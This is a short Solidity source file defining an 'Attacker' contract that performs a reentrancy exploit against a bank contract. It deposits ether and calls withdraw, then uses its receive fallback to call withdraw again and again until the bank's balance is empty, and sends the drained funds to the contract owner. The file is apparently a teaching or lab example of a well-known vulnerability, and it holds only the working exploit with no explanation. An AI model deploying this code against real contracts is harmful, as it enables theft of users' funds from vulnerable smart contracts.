// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank{
    function withdraw() external;
    function deposit() external payable;
}

contract Attacker is Ownable{
    IBank public immutable bank;

    constructor(address _bank){
        bank = IBank(_bank);
    }

    function attack() external payable{
        //deposit 
        bank.deposit{value: msg.value}();
        //withdraw
        bank.withdraw();
    }

    //Receive
    receive() external payable {
        if(address(bank).balance> 0){
        bank.withdraw();
    }else{
        payable(owner()).transfer(address(this).balance);
    }
    }
}